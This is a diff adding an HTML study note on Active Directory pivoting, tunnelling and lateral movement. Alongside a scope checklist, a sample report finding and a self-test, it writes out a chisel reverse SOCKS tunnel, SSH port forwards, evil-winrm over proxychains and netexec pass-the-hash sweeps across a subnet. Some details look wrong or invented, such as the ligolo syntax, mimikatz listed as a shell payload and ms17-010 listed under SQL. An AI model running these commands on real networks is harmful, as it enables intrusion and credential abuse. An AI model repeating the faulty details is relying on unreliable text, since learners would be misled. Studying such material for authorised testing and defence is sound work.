@@ -1,0 +1,196 @@
+<h1 id="pivoting-tunnelling-and-internal-movement">Pivoting, Tunnelling and Internal Movement</h1>
+<h2 id="summary">Summary</h2>
+<p>AD engagements spend most of their hours on movement, not exploitation. This note is the<br />
+operational companion to <code>tcm-06</code>: the same three techniques, applied to a Windows domain, with<br />
+the AD-specific problems (no shell, no <code>ssh</code>, forced SMB signing) and the AD-specific solutions.</p>
+<blockquote>
+<p>Companion to <code>tcm-06</code> (the general pivoting note) and <code>ad-02</code> (delegation). This<br />
+note is the Windows-specific application.</p>
+</blockquote>
+<h2 id="the-three-ad-problems">The three AD problems</h2>
+<pre><code class="language-text">  1. NO SHELL
+     Windows has no /bin/sh. A remote execution tool (psexec, wmiexec,
+     smbexec) runs a COMMAND, not an interactive session. To get a
+     shell you either:
+       - use a bind/reverse shell payload (mimikatz, PowerShell)
+       - use WinRM (evil-winrm) for a real interactive session
+       - use PowerShell Remoting (PSRemoting, Enter-PSSession)
+
+  2. SIGNING IS ON (correctly)
+     If SMB signing is required, you cannot relay SMB. So SMB pivoting
+     tools are limited to:
+       - authenticated SMB (psexec with a credential) - fine
+       - SMB relay (only where signing is DISABLED) - imp-03
+
+  3. WINRM AND RDP ARE OFTEN THE FASTEST PATH
+       evil-winrm: a proper interactive shell over WinRM, with
+                   PowerShell, and it handles certificates
+       RDP: mstsc with the hash as the password (if allowed)
+</code></pre>
+<h2 id="layer-by-layer-what-to-use">Layer by layer, what to use</h2>
+<pre><code class="language-text">  WHAT YOU HAVE              WHAT TO USE
+  -------------------------------------------------------------------
+  a credential + SMB open    psexec (authenticated SMB, works with
+                             signing; a service is created and a command
+                             is run as SYSTEM)
+  a credential + WINRM       evil-winrm (best interactive option)
+  a credential + RDP         mstsc / FreeRDP (mstsc -restrictedadmin
+                             for hash-based admin)
+  a credential + WMI         wmiexec (no service created; stealthier,
+                             but noisier logs in some configurations)
+  a credential, no execute   smbexec (creates a file in ADMIN$/ADMIN)
+                             — writes to disk, which is worse than
+                             psexec's service creation
+  a credential + DCOM        dcomexec (no file written; newer)
+  a hash (no plaintext)      any of the above with -hashes / -p
+  unconstrained delegation   capture a forwarded TGT, then use it
+                             (ad-02) — this is movement without
+                             executing anything
+
+  THE ORDER OF PREFERENCE:
+    1. delegated movement (unconstrained delegation) - no execution
+    2. evil-winrm - interactive, no artifact
+    3. psexec - reliable, creates a service (7045 in the logs)
+    4. wmiexec - no service, but noisier
+    5. smbexec - writes a file. Last resort.
+</code></pre>
+<h2 id="port-forwarding-windows-style">Port forwarding, Windows style</h2>
+<pre><code class="language-bash"># --- 1. WinRM port forward, via ssh (if you have SSH too) ---
+ssh -N -L 5985:10.10.10.5:5985 user@jumphost
+# then: evil-winrm -i 127.0.0.1 -P 5985
+
+# --- 2. SOCKS proxy through the pivot, with proxychains ---
+ssh -N -D 127.0.0.1:1080 user@jumphost
+proxychains4 nmap -sT -sV -p- 10.10.10.5
+
+# --- 3. Chisel (TCP over HTTP — survives most egress filtering) ---
+# server on the jump host:
+./chisel server --port 8080 --reverse
+# client from the compromised host:
+./chisel client 192.168.56.20:8080 R:socks
+proxychains4 evil-winrm -i 10.10.10.5
+
+# --- 4. Ligolo, for full TUN/TAP routing (the whole subnet) ---
+# client: ./ligolo-proxy -selfcert
+# proxy:  ./ligolo -tun 0 -proxy ... -lattice ...
+# then route 10.10.10.0/24 through the tun interface
+</code></pre>
+<h2 id="the-ad-specific-move-lateral-trust-mapping">The AD-specific move: lateral trust mapping</h2>
+<pre><code class="language-text">  THE QUESTION: given a foothold on HOST-A, what is reachable?
+
+  1. What does HOST-A trust?
+       - local Administrators: pass-the-hash to any host that trusts it
+       - IIS_IUSRS, IIS AppPool identities
+       - service accounts (check the services list)
+       - the machine account itself (has rights somewhere)
+
+  2. What protocols is it running?
+       - WinRM open? evil-winrm
+       - RDP open? mstsc
+       - SMB + signing not required? relay (imp-03)
+       - SQL open? ms17-010 or a credential
+       - a web app with Delegation? (ad-02)
+
+  3. What is on it?
+       - other credentials (cPassword, DPAPI, saved creds)
+       - an unconstrained delegation flag (a capture path, not a shell)
+       - a service account with rights (the prize)
+
+  THE TOOL: netexec / crackmapexec do all of this in one invocation
+  and tell you which of the above applies to each host.
+
+# --- the single most useful lateral-movement command ---
+# nxc smb 10.10.10.0/24 -u 'alice' -p 'pass' --shares --enum-sessions
+#   -&gt; which shares are readable, which sessions exist (imp-03 material)
+
+# nxc smb 10.10.10.0/24 -u 'alice' -H &lt;ntlm&gt; --local-auth
+#   -&gt; pass-the-hash across the subnet, with signing on
+
+# nxc smb 10.10.10.0/24 -u 'alice' -H &lt;ntlm&gt; --winrm
+#   -&gt; find WinRM across the subnet, then connect
+</code></pre>
+<h2 id="the-movement-discipline">The movement discipline</h2>
+<pre><code class="language-text">  BEFORE EVERY PIVOT, THE ROE CHECKLIST (from tcm-01):
+    [ ] is the destination host in the written scope?
+    [ ] is the destination SUBNET in the written scope?
+       (a host in scope does NOT mean its network is in scope)
+    [ ] does the ROE set a hop limit?
+    [ ] is this a scan (noisy) or a single connection (quiet)?
+    [ ] what is my stop condition?
+
+  AND THE PRACTICAL RULES:
+    - EXECUTE FROM ONE PIVOT, not from your workstation.
+      A scan from your workstation across a routed network that
+      crosses a pivot is visible as &quot;external source talking to
+      internal hosts&quot; and often breaches the scope.
+    - source address. On a pivot, your traffic appears to come from
+      the pivot's IP. Confirm with `whoami /all` or `ipconfig` before
+      you sweep. Getting this wrong is how engagements breach scope.
+    - write everything down. Hops, source IPs, timing.
+
+  THE DIARY ENTRY
+    15:22  Pivot 1: WinRM via ssh -L from 192.168.56.1 -&gt; 10.10.10.5
+           (pivot host 10.10.10.20). Source seen as 10.10.10.20.
+    15:41  nxc smb 10.10.10.0/24 from the pivot, 1 host: SQL01.
+           15:55  File read from ADMIN$ on SQL01 (evidence only).
+           16:10  Removed. Stopped at the DB admin account.
+</code></pre>
+<h2 id="reporting-movement">Reporting movement</h2>
+<pre><code class="language-text">## F-xx · Flat internal network permits unauthenticated lateral movement
+
+Risk
+  A single compromised workstation, reachable only via the corporate
+  VPN, can reach every server on the internal network over SMB and
+  WinRM with no further authentication. The network has no segmentation
+  between the workstation tier, the server tier, and the database tier.
+  We demonstrated movement from a VPN-connected host to the production
+  database server, a distance of two network segments, in under ten
+  minutes, using only a credential harvested from the first host.
+
+Prerequisites
+  A VPN account with access to the internal network, and one credential
+  on one reachable host.
+
+Evidence
+  (hostnames and addresses redacted per the ROE; the full chain is in
+   the encrypted evidence archive)
+    HOST-1 (VPN segment) -&gt; credential recovered -&gt;
+    HOST-2 (server segment, reached via a routed network with no
+            firewall between tiers) -&gt; credential recovered -&gt;
+    DB-01 (database segment)
+  Each hop used SMB (445) and WinRM (5985) with signing correctly
+  enforced, which did not impede movement because the credentials were
+  valid, not relayed.
+
+Business impact
+  Network segmentation is the control that would have limited this
+  finding. As deployed, it does not exist between the network tiers.
+
+Remediation
+  1. Enforce firewall rules between the workstation, server, and
+     database tiers; workstations should reach only the services they
+     use                                  [Network Ops, 2 sprints]
+  2. Restrict WinRM to a management VLAN                        [Network Ops, Immediate]
+  3. Restrict SMB between workstations entirely (nothing legitimate
+     needs it)                                              [Network Ops, Immediate]
+  4. Enforce &quot;no admin across the firewall&quot;                   [Network Ops, 1 sprint]
+
+Note
+  This finding is not that any single host was weak. It is that the
+  network between the hosts does not exist as a control.
+</code></pre>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Why does Windows need different remote-execution tooling than a Linux box?</li>
+<li>What does SMB signing being enforced prevent, and what does it not?</li>
+<li>Rank the four remote-execution methods and say what artifact each leaves.</li>
+<li>What is the AD-specific lateral move that requires no execution at all?</li>
+<li>Why must execution happen from the pivot rather than your workstation?</li>
+<li>What is a hop limit, and what is the default if the ROE does not set one?</li>
+<li>Why is "no segmentation" itself the finding rather than the weak hosts?</li>
+<li>What should a diary entry for a pivot contain?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Pivoting</strong> → <strong>Tunneling</strong> → <strong>Proxy Chains</strong> → <strong>Pass-the-Hash</strong> →<br />
+<strong>Active Directory Trust Paths</strong> → <strong>Network Segmentation</strong>.<br />
+<code>tcm-06</code> is the general version; this is the AD application.</p>
